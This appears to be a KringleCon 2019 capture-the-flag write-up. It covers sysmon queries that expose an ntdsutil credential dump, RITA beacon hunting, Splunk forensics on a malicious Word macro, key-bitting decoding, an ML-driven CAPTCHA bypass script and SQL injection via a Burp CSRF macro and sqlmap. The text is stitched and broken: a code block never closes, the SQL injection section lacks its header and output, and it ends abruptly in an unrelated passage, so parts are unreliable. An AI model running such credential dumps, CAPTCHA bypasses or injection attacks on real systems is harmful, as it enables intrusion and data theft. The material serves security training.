The found timestamp converts to:  
`GMT: Tuesday, November 19, 2019 12:23:55 PM`


We will search from
`GMT: Tuesday, November 19, 2019 12:23:50 PM (132186398300000000)`
to
`GMT: Tuesday, November 19, 2019 12:25:00 PM (132186399000000000)`

```
root@pv-kali:~/Desktop/logs# eql query -f sysmon-data.json "process where logon_id = 999 and timestamp > 132186398300000000 and timestamp < 132186399000000000" | jq
{
  "command_line": "C:\\Windows\\system32\\cmd.exe",
  "event_type": "process",
  "logon_id": 999,
  "parent_process_name": "lsass.exe",
  "parent_process_path": "C:\\Windows\\System32\\lsass.exe",
  "pid": 3440,
  "ppid": 632,
  "process_name": "cmd.exe",
  "process_path": "C:\\Windows\\System32\\cmd.exe",
  "subtype": "create",
  "timestamp": 132186398356220000,
  "unique_pid": "{7431d376-dedb-5dd3-0000-001027be4f00}",
  "unique_ppid": "{7431d376-cd7f-5dd3-0000-001013920000}",
  "user": "NT AUTHORITY\\SYSTEM",
  "user_domain": "NT AUTHORITY",
  "user_name": "SYSTEM"
}
{
  "command_line": "ntdsutil.exe  \"ac i ntds\" ifm \"create full c:\\hive\" q q",
  "event_type": "process",
  "logon_id": 999,
  "parent_process_name": "cmd.exe",
  "parent_process_path": "C:\\Windows\\System32\\cmd.exe",
  "pid": 3556,
  "ppid": 3440,
  "process_name": "ntdsutil.exe",
  "process_path": "C:\\Windows\\System32\\ntdsutil.exe",
  "subtype": "create",
  "timestamp": 132186398470300000,
  "unique_pid": "{7431d376-dee7-5dd3-0000-0010f0c44f00}",
  "unique_ppid": "{7431d376-dedb-5dd3-0000-001027be4f00}",
  "user": "NT AUTHORITY\\SYSTEM",
  "user_domain": "NT AUTHORITY",
  "user_name": "SYSTEM"
}
```

We find that the ntdsutil tool was used to dump the credentials.


#### Code
The challenge code is `ntdsutil`


-----------------------------
### Network Log Analysis: Determine Compromised System
#### Context
Objective
> The attacks don't stop! Can you help identify the IP address of the malware-infected system using these Zeek logs?
> For hints on achieving this objective, please visit the Laboratory and talk with Sparkle Redberry.


Hint:
Sparkle Redberry
> You got it - three cheers for cheer!
> For objective 5, have you taken a look at our Zeek logs?
> Something's gone wrong.  But I hear someone named Rita can help us.
> Can you and she figure out what happened?


Zeek logs:  
https://downloads.elfu.org/elfu-zeeklogs.zip


Rita in this case refers to:  
https://github.com/activecm/rita


#### Solution
The real difficulty of this challenge was honestly installing RITA in the first place.
Once that was done, getting the objective was relatively straightforward.
For anyone attempting this at home, just spin up a new ubuntu vm. Don't try to do this on Kali. You will waste a ton of time.

Following our own advice, we start by installing RITA on Ubuntu:

```
root@ubuntu-tmp:/home/polle/zeek# wget https://github.com/activecm/rita/releases/download/v3.1.1/install.sh
root@ubuntu-tmp:/home/polle/zeek# chmod +x install.sh
root@ubuntu-tmp:/home/polle/zeek# ./install.sh --disable-bro

Thank you for installing RITA! Happy hunting!
```

Great, that worked smoothly on Ubuntu! Now lets import our log files into RITA.

```
root@ubuntu-tmp:/home/polle/zeek# rita import elfu-zeeklogs holidayhack

```

We give it the dataset name 'holidayhack'. We wait till rita finishes parsing the logs.
Once that is done we can analyse them. We search for the beacons to try and find the infected machine.

```
root@ubuntu-tmp:/home/polle/zeek# rita show-beacons holidayhack -H | less -S
+-------+-----------------+-----------------+-------------+-------------+-----------
| SCORE |    SOURCE IP    | DESTINATION IP  | CONNECTIONS | AVG  BYTES  | INTVL RANG
+-------+-----------------+-----------------+-------------+-------------+-----------
| 0.998 | 192.168.134.130 | 144.202.46.214  |        7660 |        1156 |          1
| 0.847 | 192.168.134.131 | 150.254.186.145 |         684 |       13737 |        874
<< OUTPUT REDACTED FOR BREVITY >>

```

We find the first IP with a score of almost 1. The source IP is our flag

#### Solution 2
I actually realized during the writeup that the log archive contains a folder called ELFU.
This folder contains a webpage that hosts the RITA GUI and will allow us to see the parsed logs.

All we need to do to solve the challenge this way is double click on index.html and browse to the 'Beacons' page.
Here we immediately find the same output we found before:

![RITA Webpage](images/rita_webpage.png)


#### Code
The challenge code is `192.168.134.130`


-----------------------------
### Splunk
#### Context
Objective
> Access https://splunk.elfu.org/ as elf with password elfsocks.
> What was the message for Kent that the adversary embedded in this attack? The SOC folks at that link will help you along!
> For hints on achieving this objective, please visit the Laboratory in Hermey Hall and talk with Prof. Banas.


Hint:
Professor Banas
> Hi, I'm Dr. Banas, professor of Cheerology at Elf University.
> This term, I'm teaching HOL 404: The Search for Holiday Cheer in Popular Culture, and I've had quite a shock!
> I was at home enjoying a nice cup of Gløgg when I had a call from Kent, one of my students who interns at the Elf U SOC.
> Kent said that my computer has been _hacking_ other computers on campus and that I needed to fix it ASAP!
> If I don't, he will have to report the incident to the boss of the SOC.
> Apparently, I can find out more information from this website [https://splunk.elfu.org/](https://splunk.elfu.org/) with the username: `elf` / Password: `elfsocks`.
> I don't know anything about computer security.  Can you please help me?


Url:  
https://splunk.elfu.org/


#### Solution
Upon logging in with the provided credentials, we end up on a sort of chat interface for the ElfU SOC.
Here we get to talk with some of the Elves who will give us tips to complete the objectives.

![Splunk Chat](images/splunk_soc_chat.png)

The actual splunk interface can be accessed by clicking on the 'search' tab. There is also a 'File Archive' tab that contains files related to events captured by splunk.

![Splunk Search](images/splunk_search.png)

We are given several challenges to complete using the search engine. Each new challenge is unlocked after completing the previous one.
Doing all the challenges is not required, you only need to complete the main challenge, which is:
> What was the message for Kent that the adversary embedded in this attack?

However we will go over all the challenges here and conclude with the main challenge. Lets get started!


##### Challenge 1
Objective:
> What is the short host name of Professor Banas' computer?

Solution:
> sweetums

Search:  
We start by just reading all the chats. We find the name of the host in the chat with '#ELFU SOC'
They say:
> Yep. And we have some system called 'sweetums' here on campus communicating with the same weird IP'


##### Challenge 2
Objective:
> What is the name of the sensitive file that was likely accessed and copied by the attacker?
> Please provide the fully qualified location of the file. (Example: C:\temp\report.pdf)

Solution:
> C:\Users\cbanas\Documents\Naughty_and_Nice_2019_draft.txt

Search:  
We get taught how to search for anything related to the user cbanas (`index=main cbanas`) and told to search instead for santa.
We search for:
```
index=main santa
```
We find that the very first result contains:
```
ParameterBinding(Format-List): name="InputObject"; value="C:\Users\cbanas\Documents\Naughty_and_Nice_2019_draft.txt:1:Carl, you know there's no one I trust more than you to help.  Can you have a look at t
his draft Naughty and Nice list for 2019 and let me know your thoughts? -Santa"
```


##### Challenge 3
Objective:
> What is the fully-qualified domain name(FQDN) of the command and control(C2) server? (Example: badguy.baddies.com)

Solution:
> 144.202.46.214.vultr.com

Search:  
We get told how to search sysmon logs, they also tell us to search for eventcode 3 (network) and for powershell:
```
index=main sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational powershell EventCode=3
```
We quickly find network connections to '144.202.46.214.vultr.com'
We can also just look at the 'interesting field' `DestinationHostame` at the left hand side of the interface

![Splunk Interesting Fields](images/splunk_interesting_fields.png)


##### Challenge 4
Objective:
> What document is involved with launching the malicious PowerShell code?
> Please provide just the filename. (Example: results.txt)

Solution:
> 19th Century Holiday Cheer Assignment.docm

Search:  
We get told to search for all the powershell logs on the system:

```
index=main sourcetype="WinEventLog:Microsoft-Windows-Powershell/Operational"
```
We learn that we can order results by time by piping them to '| reverse'.
We then search for a 5 second time window from the oldest event.
```
index=main sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational (within the time window)
```
- 5864 (16E8) -> dead end
- 6268 (187C)

![Splunk Process Ids](images/splunk_procids.png)

We can use those in the following search:
```
index=main sourcetype=WinEventLog EventCode=4688 process_id=0x187C
```
From here we find one log that contains a word process opening the file
```
Process Command Line: "C:\Program Files (x86)\Microsoft Office\Root\Office16\WINWORD.EXE" /n "C:\Windows\Temp\Temp1_Buttercups_HOL404_assignment (002).zip\19th Century Holiday Cheer Assignment.docm" /o ""
```

##### Challenge 5
Objective:
> How many unique email addresses were used to send Holiday Cheer essays to Professor Banas?
> Please provide the numeric value. (Example: 1)

Solution:
> 21

Search:  
We get told how to search through stoQ data:
```
index=main sourcetype=stoq | table _time results{}.workers.smtp.to results{}.workers.smtp.from  results{}.workers.smtp.subject results{}.workers.smtp.body | sort - _time
```
We also get told that all emails had to be with subject line: 'Holiday Cheer Assignment Submission'.

We narrow down our search to only the fields containing the subject line and emails going only to carl:
```
index=main sourcetype=stoq | table _time results{}.workers.smtp.to results{}.workers.smtp.from  results{}.workers.smtp.subject results{}.workers.smtp.body | search results{}.workers.smtp.subject="*Holiday
 Cheer Assignment Submission*" results{}.workers.smtp.to="*carl*"
```

We find 21 results.


##### Challenge 6
Objective:
> What was the password for the zip archive that contained the suspicious file?

Solution:
> 123456789

Search:  
We just search the email bodies for things containing the word "password"
```
index=main sourcetype=stoq | table _time results{}.workers.smtp.to results{}.workers.smtp.from  results{}.workers.smtp.subject results{}.workers.smtp.body | search results{}.workers.smtp.body="*password*"
```


##### Challenge 7
Objective:
> What email address did the suspicious file come from?

Solution:
> Bradly.Buttercups@eIfu.org

Search:  
From the previous challenge we immediately find this one.


##### Main Challenge
Objective:
> What was the message for Kent that the adversary embedded in this attack?

Solution:
> Kent you are so unfair. And we were going to make you the king of the Winter Carnival.

Search:  
We start with this email:
```
index=main sourcetype=stoq  "results{}.workers.smtp.from"="bradly buttercups <bradly.buttercups@eifu.org>"
```
We add the eval code givent to us to make the output more readable:
```
index=main sourcetype=stoq  "results{}.workers.smtp.from"="bradly buttercups <bradly.buttercups@eifu.org>" | eval results = spath(_raw, "results{}")
| mvexpand results
| eval path=spath(results, "archivers.filedir.path"), filename=spath(results, "payload_meta.extra_data.filename"), fullpath=path."/".filename
| search fullpath!=""
| table filename,fullpath
```
We find the .docm file:
```
3   19th Century Holiday Cheer Assignment.docm  /home/ubuntu/archive/c/6/e/1/7/c6e175f5b8048c771b3a3fac5f3295d2032524af/19th Century Holiday Cheer Assignment.docm
```
When we open this file, we find a message telling us to look in core.xml instead.
```
19  core.xml    /home/ubuntu/archive/f/f/1/e/a/ff1ea6f13be3faabd0da728f514deb7fe3577cc4/core.xml
```

In that file we find the message to Kent.


#### Code
The challenge code is `Kent you are so unfair. And we were going to make you the king of the Winter Carnival.`

### Get Access To The Steam Tunnels
#### Context
Objective
> Gain access to the steam tunnels.
> Who took the turtle doves?
> Please tell us their first and last name.
> For hints on achieving this objective, please visit Minty's dorm room and talk with Minty Candy Cane.

Hint:
Minty Candycane
> You made it - congrats!
> Have you played with the key grinder in my room?  Check it out!
> It turns out: if you have a good image of a key, you can physically copy it.
> Maybe you'll see someone hopping around with a key here on campus.
> _Sometimes you can find it in the Network tab of the browser console._
> Deviant has a great talk on it at this year's Con.
> He even has a collection of key bitting templates for common vendors like Kwikset, Schlage, and Yale.

Location:  
Minty's Dorm Room


#### Solution
We see a man (Krampus) run away with a key attached to his pocket when we enter the room.
We can get a better image of the key (and Krampus) by watching our Network tab in firefox.

We notice that a bunch of images are being pulled when we enter the room (including the one of Krampus).
We see the image here.

URL: `2019.kringlecon.com/images/avatars/elves/krampus.png`

![Krampus Key](images/krampus_key.png)

We can have a closer look at the key now and try to guess the bitting values.
Our first guess (just eyeballing the key) is the following:
```
122521
```

However, we can use any image editor to get a better idea of the key and then use the key bitting templates provided by Deviant.
By going over the templates from Deviant we quickly find the right template [here](https://github.com/deviantollam/decoding/blob/master/Key%20Decoding/Decoding%20-%20Schlage.png):

We are dealing with a 'Schlage' key.
![Krampus Template](images/krampus_template.png)

We download the template and overlay it in Gimp to find the correct values.
We find that the correct value is 122520. Pretty close to what we expected from first glance.

We create the key and open the door.

After travelling through the tunnels, we find Krampus and learn that his full name is Krampus Hollyfeld and that he took the doves.

Krampus:
> Hello there!  I’m Krampus Hollyfeld.
> I maintain the steam tunnels underneath Elf U,
> Keeping all the elves warm and jolly.
> Though I spend my time in the tunnels and smoke,
> In this whole wide world, there's no happier bloke!
> Yes, I borrowed Santa’s turtle doves for just a bit.
> Someone left some scraps of paper near that fireplace, which is a big fire hazard.
> I sent the turtle doves to fetch the paper scraps.
> But, before I can tell you more, I need to know that I can trust you.
> Tell you what – if you can help me beat the [Frido Sleigh](https://fridosleigh.com/) contest (Objective 8), then I'll know I can trust you.
> The contest is here on my screen and at [fridosleigh.com](https://fridosleigh.com/).
> No purchase necessary, enter as often as you want, so I am!
> They set up the rules, and lately, I have come to realize that I have certain materialistic, cookie needs.
> Unfortunately, it's restricted to elves only, and I can't bypass the CAPTEHA.
> (That's Completely Automated Public Turing test to tell Elves and Humans Apart.)
> I've already cataloged [12,000 images](https://downloads.elfu.org/capteha_images.tar.gz) and decoded the [API interface](https://downloads.elfu.org/capteha_api.py).
> Can you help me bypass the CAPTEHA and submit lots of entries?


#### Code
The code for this challenge is `Krampus Hollyfeld`.

Location:  
Steam Tunnels


#### Solution
The solution is pretty much provided for us.
We have the api script to submit the correct responses.
We have the github script to train our machine learning model
We then just need to train the model and connect it to the api script.


Upon completing the challenge, you receive a personalized email with the objective code.
That is all.

We start by:
- Cloning the git repo
- Downloading the api script
- Downloading the images archive
- Unzipping the archive
```
polle@polle-pc:/tmp/solution $ git clone  https://github.com/chrisjd20/img_rec_tf_ml_demo

<-- Output removed for brevity -->
polle@polle-pc:/tmp/solution/img_rec_tf_ml_demo $ wget https://downloads.elfu.org/capteha_images.tar.gz
<-- Output removed for brevity -->
polle@polle-pc:/tmp/solution/img_rec_tf_ml_demo $ rm training_images/* -r
polle@polle-pc:/tmp/solution/img_rec_tf_ml_demo $ mv capteha_images.tar.gz training_images/
polle@polle-pc:/tmp/solution/img_rec_tf_ml_demo $ cd training_images
polle@polle-pc:/tmp/solution/img_rec_tf_ml_demo/training_images $ tar xvf capteha_images.tar.gz
<-- Output removed for brevity -->
polle@polle-pc:/tmp/solution/img_rec_tf_ml_demo/training_images $ cd ..
```

We can now already start the training process for the ML model:
```
polle@polle-pc:/tmp/solution/img_rec_tf_ml_demo $ python3 retrain.py --image_dir training_image
<-- Output removed for brevity -->
```
While that is running, we can start on merging the prediction script and the api script.
We copy the entire contents of `capteha_api.py` into `predict_images_using_trained_model.py`.
Rather than making the two scripts work together, we are just going to merge them into one. As that will be significantly faster.
```
polle@polle-pc:/tmp/solution/img_rec_tf_ml_demo $ cat capteha_api.py >> predict_images_using_trained_model.py
```

We change the original `def main()` method for the prediction script to `def main_predict()`
We also remove the first occurance of the code block (because it is duplicated):
```
if __name__ == "__main__":
    main()
```

We should also add the `base64` and `re` modules as we are going to need those. Just add the following below the other imports at the top of the file
```
import base64
import re
```

Next, we comment out the following line:
```
final_answer = ','.join( [ img['uuid'] for img in b64_images ] )
```
So it looks like:
```
#final_answer = ','.join( [ img['uuid'] for img in b64_images ] )
```
Now we can replace the text
```
    '''
    MISSING IMAGE PROCESSING AND ML IMAGE PREDICTION CODE GOES HERE
    '''
```
with our implementation code:
```
    for img in b64_images:
        i_uuid = img['uuid']
        i_base64 = img['base64']
        open(f"unknown_images/{i_uuid}.png", 'wb').write(base64.b64decode(i_base64))

    results = main_predict() 

    found_images = list()
    for img in results:
        if results[img] in challenge_image_types:
            found_images.append(img)

    final_answer = ','.join( found_images )
```
Now all that remains is to edit the `main_predict` function to return our data in an appropriate format:
We need to replace the following block:
```
for prediction in prediction_results:
    print('TensorFlow Predicted {img_full_path} is a {prediction} with {percent:.2%} Accuracy'.format(**prediction))

```
with our own snippet:
```
uuids = {}
for prediction in prediction_results:
    uuids[re.search('/([^/]+?).png', prediction['img_full_path']).groups(1)[0]] = prediction['prediction']

return uuids
```

And that is all. We can fill in our email inside the script and run it to win! Do make sure you wait until the training process we started earlier is complete though! We should also clear the folder `unknown_images` before each run.
```
polle@polle-pc:/tmp/solution/img_rec_tf_ml_demo $ rm unknown_images/*
polle@polle-pc:/tmp/solution/img_rec_tf_ml_demo $ ./predict_images_using_trained_model.py

#### Solution
While playing around with the application, we notice very quickly that it uses special csrf tokens.
We will use burp as a proxy for our SQL injection, we can leave it to burp to handle grabbing the token and updating the request.

Burp config:
- Make a new macro (project options -> macro) called 'Get-Csrf'
- Capture a request made to https://studentportal.elfu.org/validator.php
- Select configure item, unselect any rules regarding cookies and create a new one for 'Custom Parameter Locations'
- Parameter name: 'token'
- Start after expression: '\r\n\r\n'
- End at delimiter: '$'

This will select the csrf token returned by the request to /validator.php
Now add a new Session handling rule (project options -> Session Handling)
- Click on add
- Call it add_token
- Go to scope tab and enable the 'Proxy' functionality. Also select a proper scope 'https://studentportal.elfu.org'
- Go back to the details tab and add a rule 'run a macro'
- select the macro we made before

![Burp Config 1](images/burp_config_1.png)
![Burp Config 2](images/burp_config_2.png)
![Burp Config 3](images/burp_config_3.png)

Burp is now configured properly to update the csrf token on the fly.

We can now try a request to 
```
/application-check.php?elfmail=testelf%40gmail.com'&token=any_value_here (Note the single quote in the email field)
```
Because we proxy our request through burp, burp will automatically execute our macro and fetch the CSRF token for us.


This will give us an SQL error:
```
Error: SELECT status FROM applications WHERE elfmail = 'testelf@gmail.com'';<br>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''testelf@gmail.com''' at line 1
```

Excellent. We can now let sqlmap work it's magic on this endpoint through burp.
Note the `--proxy` flag to allow burp to work its magic.

```

Excellent, now sqlmap has al the info it needs to dump the database. So lets do exactly that. Instead of a full dump however, we will be a little bit more specific to save some time!
We list all the databases in the table, we find the `elfu` database and list all its tables. We spot the `krampus` table. Which is what we will dump.

```
root@pv-kali:~# sqlmap --proxy=http://localhost:8080 --url="https://studentportal.elfu.org/application-check.php?elfmail=testelf%40gmail.com&token=blah" -p elfmail --dbs

We get all these scraps of paper. 
If we use our Gimp / Photoshop / Paint skills, we can quickly piece these together and read the full note. 
One piece is missing, so we do not know who sent the note. (Though the symbol is a giveaway)
